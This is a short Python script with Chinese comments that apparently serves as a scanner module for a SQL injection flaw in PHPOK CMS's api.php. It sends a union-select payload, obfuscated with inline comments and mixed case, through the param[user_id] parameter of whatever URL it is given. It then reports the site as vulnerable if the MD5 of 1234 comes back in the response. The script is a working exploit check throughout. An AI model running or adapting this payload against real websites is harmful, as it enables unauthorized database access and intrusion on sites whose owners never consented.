#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: phpok api.php SQL注入漏洞
referer: http://www.moonsec.com/post-677.html
author: Lucifer
description: api_control文件存在SQL注入。
'''
import sys
import requests
import warnings
from termcolor import cprint

class phpok_api_param_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/api.php?c=api&f=phpok&id=_total&param[pid]=42&param[user_id]=0)UnIOn/**/sElEcT/**/mD5(1234)/**/LIMIT/**/1,1%23"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
                cprint("[+]存在phpok api.php SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")

        except:
            cprint("[-] "+__file__+"====>连接超时", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = phpok_api_param_sqli_BaseVerify(sys.argv[1])
    testVuln.run()